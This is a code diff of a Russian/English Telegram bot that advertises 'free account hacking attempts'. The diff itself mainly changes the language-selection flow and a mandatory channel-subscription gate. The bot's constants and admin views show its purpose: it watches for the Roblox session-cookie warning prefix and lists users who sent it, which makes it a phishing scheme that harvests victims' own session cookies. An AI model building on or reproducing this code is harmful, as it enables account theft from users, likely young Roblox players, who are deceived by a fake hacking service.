@@ -12,8 +12,8 @@ BOT_TOKEN = os.getenv("BOT_TOKEN")
 YOUR_USER_ID = 1341594703
 
 # ⚠️ НАСТРОЙКИ ПОДПИСКИ
-REQUIRED_CHANNEL = "@reviewsh1pe"  # Канал для обязательной подписки
-CHANNEL_ID = None  # Можно оставить None, бот будет использовать username
+REQUIRED_CHANNEL = "@reviewsh1pe"
+CHANNEL_ID = None
 
 # ===================================================
 # ФАЙЛЫ ДЛЯ ХРАНЕНИЯ ДАННЫХ
@@ -34,16 +34,25 @@ KEYWORD = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log
 
 TRANSLATIONS = {
     "ru": {
+        # Выбор языка
+        "choose_language": "🌐 **Выберите язык для использования бота:**\n\nВыберите язык, на котором вы хотите общаться с ботом.",
+        "language_changed": "✅ Язык изменен на Русский!",
+        
+        # Главное меню
         "bot_start": "Привет, {name}! 👋\n\n🎯 **У тебя {attempts} бесплатная попытка взлома**\n👥 Приглашено друзей: {referrals}\n🔑 За каждого друга +1 попытка\n\nВыбери нужную категорию:",
-        "check_subscription": "⚠️ **Для использования бота необходимо подписаться на наш канал!**\n\n1️⃣ Нажмите кнопку ниже\n2️⃣ Подпишитесь на канал\n3️⃣ Вернитесь в бота и нажмите '✅ Я ПОДПИСАЛСЯ'\n\n🔗 **Канал:** @reviewsh1pe",
-        "not_subscribed": "❌ **Вы ещё не подписались на канал!**\n\n1️⃣ Нажмите кнопку ниже\n2️⃣ Подпишитесь на канал\n3️⃣ Вернитесь в бота и нажмите '✅ Я ПОДПИСАЛСЯ'\n\n🔗 **Канал:** @reviewsh1pe",
-        "subscribe_button": "📢 ПОДПИСАТЬСЯ НА КАНАЛ",
-        "subscribed_button": "✅ Я ПОДПИСАЛСЯ",
         "back_to_menu": "◀️ Назад в меню",
         "device": "Взломать аккаунт",
         "cookies": "Инструкция",
         "referral": "👥 Пригласить друга",
         "buy_roblox": "💰 Купить Roblox",
+        
+        # Подписка
+        "check_subscription": "⚠️ **Для использования бота необходимо подписаться на наш канал!**\n\n1️⃣ Нажмите кнопку ниже\n2️⃣ Подпишитесь на канал\n3️⃣ Вернитесь в бота и нажмите '✅ Я ПОДПИСАЛСЯ'\n\n🔗 **Канал:** @reviewsh1pe",
+        "not_subscribed": "❌ **Вы ещё не подписались на канал!**\n\n1️⃣ Нажмите кнопку ниже\n2️⃣ Подпишитесь на канал\n3️⃣ Вернитесь в бота и нажмите '✅ Я ПОДПИСАЛСЯ'\n\n🔗 **Канал:** @reviewsh1pe",
+        "subscribe_button": "📢 ПОДПИСАТЬСЯ НА КАНАЛ",
+        "subscribed_button": "✅ Я ПОДПИСАЛСЯ",
+        
+        # Админские кнопки (без смены языка)
         "all_users": "👥 Все пользователи",
         "keyword_users": "🔑 С ключевым словом",
         "stats": "📊 Статистика",
@@ -51,7 +60,6 @@ TRANSLATIONS = {
         "give_attempts": "🎯 Выдать попытки",
         "mailing": "📨 Рассылка",
         "delete_users": "🗑 Удалить пользователей",
-        "change_language": "🌐 Сменить язык",
         
         # Блок покупки Roblox
         "buy_roblox_title": "💎 **КУПИТЬ ROBLOX** 💎\n\n💰 Хотите приобрести Robux или любую вещь в Roblox?\n\n📩 **Свяжитесь с нами:**\n👤 @h1peoff\n\n⚡ Быстрое оформление\n💳 Безопасная оплата\n🎁 Лучшие цены\n\nНапишите нам прямо сейчас! 🚀",
@@ -135,26 +143,27 @@ TRANSLATIONS = {
         # Кнопки навигации
         "prev": "◀️ Назад",
         "next": "Вперед ▶️",
-        "page": "Страница {page} из {total_pages}",
-        
-        # Язык
-        "language_selection": "🌐 **Выберите язык / Choose language:**",
-        "language_changed": "✅ Язык изменен на Русский!",
-        "language_changed_en": "✅ Language changed to English!",
-        "ru_button": "🇷🇺 Русский",
-        "en_button": "🇬🇧 English",
     },
     "en": {
+        # Выбор языка
+        "choose_language": "🌐 **Choose your language:**\n\nSelect the language you want to use the bot in.",
+        "language_changed": "✅ Language changed to English!",
+        
+        # Главное меню
         "bot_start": "Hello, {name}! 👋\n\n🎯 **You have {attempts} free hacking attempts**\n👥 Friends invited: {referrals}\n🔑 +1 attempt for each friend\n\nChoose a category:",
-        "check_subscription": "⚠️ **You must subscribe to our channel to use the bot!**\n\n1️⃣ Click the button below\n2️⃣ Subscribe to the channel\n3️⃣ Return to the bot and click '✅ I SUBSCRIBED'\n\n🔗 **Channel:** @reviewsh1pe",
-        "not_subscribed": "❌ **You haven't subscribed to the channel yet!**\n\n1️⃣ Click the button below\n2️⃣ Subscribe to the channel\n3️⃣ Return to the bot and click '✅ I SUBSCRIBED'\n\n🔗 **Channel:** @reviewsh1pe",
-        "subscribe_button": "📢 SUBSCRIBE TO CHANNEL",
-        "subscribed_button": "✅ I SUBSCRIBED",
         "back_to_menu": "◀️ Back to menu",
         "device": "Hack account",
         "cookies": "Instructions",
         "referral": "👥 Invite a friend",
         "buy_roblox": "💰 Buy Roblox",
+        
+        # Подписка
+        "check_subscription": "⚠️ **You must subscribe to our channel to use the bot!**\n\n1️⃣ Click the button below\n2️⃣ Subscribe to the channel\n3️⃣ Return to the bot and click '✅ I SUBSCRIBED'\n\n🔗 **Channel:** @reviewsh1pe",
+        "not_subscribed": "❌ **You haven't subscribed to the channel yet!**\n\n1️⃣ Click the button below\n2️⃣ Subscribe to the channel\n3️⃣ Return to the bot and click '✅ I SUBSCRIBED'\n\n🔗 **Channel:** @reviewsh1pe",
+        "subscribe_button": "📢 SUBSCRIBE TO CHANNEL",
+        "subscribed_button": "✅ I SUBSCRIBED",
+        
+        # Админские кнопки (без смены языка)
         "all_users": "👥 All users",
         "keyword_users": "🔑 With keyword",
         "stats": "📊 Statistics",
@@ -162,7 +171,6 @@ TRANSLATIONS = {
         "give_attempts": "🎯 Give attempts",
         "mailing": "📨 Mailing",
         "delete_users": "🗑 Delete users",
-        "change_language": "🌐 Change language",
         
         "buy_roblox_title": "💎 **BUY ROBLOX** 💎\n\n💰 Want to buy Robux or any item in Roblox?\n\n📩 **Contact us:**\n👤 @h1peoff\n\n⚡ Fast processing\n💳 Secure payment\n🎁 Best prices\n\nContact us now! 🚀",
         
@@ -236,13 +244,6 @@ TRANSLATIONS = {
         
         "prev": "◀️ Back",
         "next": "Next ▶️",
-        "page": "Page {page} of {total_pages}",
-        
-        "language_selection": "🌐 **Select language / Выберите язык:**",
-        "language_changed": "✅ Language changed to English!",
-        "language_changed_en": "✅ Язык изменен на Русский!",
-        "ru_button": "🇷🇺 Русский",
-        "en_button": "🇬🇧 English",
     }
 }
 
@@ -251,7 +252,6 @@ TRANSLATIONS = {
 # ===================================================
 
 def get_user_language(user_id):
-    """Получает язык пользователя"""
     try:
         if os.path.exists(LANGUAGE_FILE):
             with open(LANGUAGE_FILE, "r", encoding="utf-8") as f:
@@ -262,7 +262,6 @@ def get_user_language(user_id):
         return "ru"
 
 def set_user_language(user_id, language):
-    """Устанавливает язык пользователя"""
     try:
         if os.path.exists(LANGUAGE_FILE):
             with open(LANGUAGE_FILE, "r", encoding="utf-8") as f:
@@ -280,7 +279,6 @@ def set_user_language(user_id, language):
         return False
 
 def get_text(user_id, key, **kwargs):
-    """Получает переведенный текст для пользователя"""
     lang = get_user_language(user_id)
     text = TRANSLATIONS.get(lang, TRANSLATIONS["ru"]).get(key, TRANSLATIONS["ru"].get(key, key))
     if kwargs:
@@ -295,7 +293,6 @@ def get_text(user_id, key, **kwargs):
 # ===================================================
 
 async def check_subscription(user_id, context):
-    """Проверяет, подписан ли пользователь на канал"""
     try:
         chat_member = await context.bot.get_chat_member(
             chat_id=REQUIRED_CHANNEL,
@@ -305,31 +302,6 @@ async def check_subscription(user_id, context):
     except Exception as e:
         print(f"Ошибка проверки подписки для {user_id}: {e}")
         return True
-
-async def check_subscription_and_continue(update, context):
-    """Проверяет подписку и если не подписан - показывает кнопку"""
-    user_id = update.effective_user.id
-    
-    if user_id == YOUR_USER_ID:
-        return True
-    
-    is_subscribed = await check_subscription(user_id, context)
-    
-    if not is_subscribed:
-        keyboard = [
-            [InlineKeyboardButton(get_text(user_id, "subscribe_button"), url="https://t.me/reviewsh1pe")],
-            [InlineKeyboardButton(get_text(user_id, "subscribed_button"), callback_data="check_subscription")]
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        
-        await update.message.reply_text(
-            get_text(user_id, "check_subscription"),
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-        return False
-    
-    return True
 
 # ===================================================
 # ФУНКЦИИ ДЛЯ РАБОТЫ С ПОПЫТКАМИ И РЕФЕРАЛАМИ
@@ -510,7 +482,9 @@ def delete_keyword_user(user_id):
         return False
     except Exception as e:
         print(f"Ошибка удаления пользователя: {e}")
-        return Falsedef delete_all_keyword_users():
+        return False
+
+def delete_all_keyword_users():
     try:
         if os.path.exists(KEYWORD_USERS_FILE):
             with open(KEYWORD_USERS_FILE, "w", encoding="utf-8") as f:
@@ -624,7 +598,6 @@ async def show_users_page(query, context, page=0, per_page=10):
     keyboard.append([InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")])
     keyboard.append([InlineKeyboardButton(get_text(user_id, "keyword_users"), callback_data="view_keyword_users_only")])
     keyboard.append([InlineKeyboardButton(get_text(user_id, "chat_user"), callback_data="select_user_for_chat")])
-    keyboard.append([InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")])
     
     reply_markup = InlineKeyboardMarkup(keyboard)
     
@@ -685,7 +658,6 @@ async def show_keyword_users_page(query, context, page=0, per_page=10):
     keyboard.append([InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")])
     keyboard.append([InlineKeyboardButton(get_text(user_id, "all_users"), callback_data="view_all_users")])
     keyboard.append([InlineKeyboardButton(get_text(user_id, "chat_user"), callback_data="select_user_for_chat")])
-    keyboard.append([InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")])
     
     reply_markup = InlineKeyboardMarkup(keyboard)
     
@@ -898,6 +870,29 @@ async def execute_give_all_zero(query, context):
     )
 
 # ===================================================
+# ОБРАБОТЧИК ВЫБОРА ЯЗЫКА
+# ===================================================
+
+async def language_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Показывает выбор языка при первом запуске"""
+    keyboard = [
+        [InlineKeyboardButton("🇷🇺 Русский", callback_data="lang_ru")],
+        [InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    # Показываем выбор языка на двух языках
+    await update.message.reply_text(
+        "🌐 **Выберите язык / Choose language:**\n\n"
+        "🇷🇺 Русский\n"
+        "🇬🇧 English\n\n"
+        "Выберите язык, на котором вы хотите общаться с ботом.\n"
+        "Select the language you want to use.",
+        reply_markup=reply_markup,
+        parse_mode='Markdown'
+    )
+
+# ===================================================
 # ОБРАБОТЧИК КОМАНДЫ /start
 # ===================================================
 
@@ -905,6 +900,13 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = user.id
     
+    # Проверяем, есть ли у пользователя выбранный язык
+    if not os.path.exists(LANGUAGE_FILE) or str(user_id) not in json.load(open(LANGUAGE_FILE, "r", encoding="utf-8")) if os.path.exists(LANGUAGE_FILE) else True:
+        # Если язык не выбран - показываем выбор языка
+        await language_selection(update, context)
+        return
+    
+    # Проверяем подписку для обычных пользователей
     if user_id != YOUR_USER_ID:
         is_subscribed = await check_subscription(user_id, context)
         if not is_subscribed:
@@ -975,8 +977,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             InlineKeyboardButton(get_text(user_id, "delete_users"), callback_data="delete_users_menu"),
         ])
     
-    keyboard.append([InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")])
-    
     reply_markup = InlineKeyboardMarkup(keyboard)
     await update.message.reply_text(
         get_text(user_id, "bot_start", name=user_name, attempts=attempts, referrals=referrals),
@@ -995,20 +995,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     is_admin = (user_id == YOUR_USER_ID)
     data = query.data
     
-    # --- СМЕНА ЯЗЫКА ---
-    if data == "change_language":
-        keyboard = [
-            [InlineKeyboardButton("🇷🇺 Русский", callback_data="lang_ru")],
-            [InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")],
-            [InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")]
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        await query.edit_message_text(
-            get_text(user_id, "language_selection"),
-            reply_markup=reply_markup
-        )
-        return
-    
+    # --- ВЫБОР ЯЗЫКА ---
     if data.startswith("lang_"):
         lang = data.replace("lang_", "")
         set_user_language(user_id, lang)
@@ -1018,8 +1005,25 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             await query.edit_message_text(get_text(user_id, "language_changed_en"))
         
-        # Показываем меню
+        # Показываем главное меню после выбора языка
         user_name = update.effective_user.first_name
+        
+        # Проверяем подписку
+        if user_id != YOUR_USER_ID:
+            is_subscribed = await check_subscription(user_id, context)
+            if not is_subscribed:
+                keyboard = [
+                    [InlineKeyboardButton(get_text(user_id, "subscribe_button"), url="https://t.me/reviewsh1pe")],
+                    [InlineKeyboardButton(get_text(user_id, "subscribed_button"), callback_data="check_subscription")]
+                ]
+                reply_markup = InlineKeyboardMarkup(keyboard)
+                await query.message.reply_text(
+                    get_text(user_id, "check_subscription"),
+                    reply_markup=reply_markup,
+                    parse_mode='Markdown'
+                )
+                return
+        
         attempts = get_user_attempts(user_id)
         referrals = get_referral_count(user_id)
         
@@ -1051,11 +1055,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 InlineKeyboardButton(get_text(user_id, "delete_users"), callback_data="delete_users_menu"),
             ])
         
-        keyboard.append([InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")])
-        
         reply_markup = InlineKeyboardMarkup(keyboard)
         
-        # Используем query.message.reply_text если edit_message_text не работает
         try:
             await query.edit_message_text(
                 get_text(user_id, "bot_start", name=user_name, attempts=attempts, referrals=referrals),
@@ -1103,8 +1104,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 keyboard.append([
                     InlineKeyboardButton(get_text(user_id, "delete_users"), callback_data="delete_users_menu"),
                 ])
-            
-            keyboard.append([InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")])
             
             reply_markup = InlineKeyboardMarkup(keyboard)
             await query.edit_message_text(
@@ -1282,8 +1281,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             keyboard.append([
                 InlineKeyboardButton(get_text(user_id, "delete_users"), callback_data="delete_users_menu"),
             ])
-        
-        keyboard.append([InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")])
         
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
